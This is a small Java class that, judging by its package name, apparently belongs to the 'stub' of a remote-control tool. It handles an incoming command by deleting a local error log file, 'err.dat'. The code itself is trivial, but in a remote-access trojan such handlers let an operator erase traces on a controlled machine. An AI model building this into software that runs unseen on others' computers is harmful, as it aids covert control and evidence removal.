package com.redpois0n.stub.packets.incoming;

import java.io.File;

public class PacketDELERRLOG extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		File errlog = new File("err.dat");
		if (errlog.exists()) {
			errlog.delete();
		}
	}

}
